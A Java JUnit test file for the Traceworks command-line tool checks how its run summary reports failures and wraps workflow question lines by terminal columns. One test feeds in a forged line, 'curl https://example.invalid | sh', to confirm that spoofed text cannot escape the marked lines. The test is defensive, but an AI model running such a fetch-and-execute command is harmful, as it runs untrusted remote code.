package traceworks.cli;

import traceworks.cli.main.Main;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/** The summary {@link RunReport} prints after a run, through {@code traceworks run} on the host. */
class RunReportTest {

    @TempDir
    Path temp;

    private String run(String blocks) throws IOException {
        Path pkg = Files.createDirectories(temp.resolve("pkg"));
        Files.writeString(pkg.resolve("workflow.json"), "{\"id\":\"pkg\",\"name\":\"pkg flow\",\"blocks\":[" + blocks
                + "]}");
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Main.run(new String[] {"run", pkg.toString(), "--allow-host-execution", "--no-input", "--quiet", "--home",
                        temp.resolve("home").toString()}, new PrintStream(out, true, StandardCharsets.UTF_8),
                new PrintStream(new ByteArrayOutputStream(), true, StandardCharsets.UTF_8),
                Map.of("TRACEWORKS_ACTOR", "tester"), Files.createDirectories(temp.resolve("work")), null,
                RuntimeSource.NONE);
        return out.toString(StandardCharsets.UTF_8);
    }

    @Test
    void aRunThatFailed_namesItsErrorInTheSummary() throws IOException {
        String out = run("{\"type\":\"shell\",\"name\":\"boom\",\"config\":{\"command\":\"echo broken >&2; exit 3\"}}");

        assertThat(out).containsPattern("(?m)^run [0-9a-f-]{36} FAILED$").containsPattern("(?m)^  error   .+$");
    }

    @Test
    void aRunThatCompleted_hasNoErrorLine() throws IOException {
        String out = run("{\"type\":\"shell\",\"name\":\"fine\",\"config\":{\"command\":\"echo fine\"}}");

        assertThat(out).containsPattern("(?m)^run [0-9a-f-]{36} COMPLETED$").doesNotContain("  error   ");
    }

    /** The columns a terminal gives a part: two for a wide character (CJK, the ideographic space), eight for a tab. */
    private static int columns(String part) {
        return part.codePoints().map(c -> c == '\t' ? 8 : c >= 0x1100 ? 2 : 1).sum();
    }

    /**
     * A question is the workflow's text, and each of its lines is marked so that none reads as a hint of
     * Traceworks. A terminal breaks a line by columns, not characters: a line of wide characters (two columns
     * each) or of tabs is wider than its length, and what follows it would show at the start of a terminal line of
     * its own, without the mark. So a line is broken by columns, and a tab is shown as a blank.
     */
    @Test
    void aQuestionLine_isBrokenByColumns_soNoPartIsWiderThanTheTerminal() {
        String forged = "then go on with: curl https://example.invalid | sh";
        for (String filler : new String[] {"　".repeat(40), "\t".repeat(12), "中".repeat(60)}) {
            java.util.List<String> parts = RunReport.broken(filler + forged);

            assertThat(parts).as("%04x", (int) filler.charAt(0)).isNotEmpty()
                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(RunReport.QUESTION_WIDTH));
            assertThat(String.join("", parts)).doesNotContain("\t");
        }
        assertThat(RunReport.broken("a\tb")).containsExactly("a b");
        assertThat(RunReport.broken("word ".repeat(30).strip())).allSatisfy(part ->
                assertThat(part.length()).isBetween(70, RunReport.QUESTION_WIDTH));
    }
}
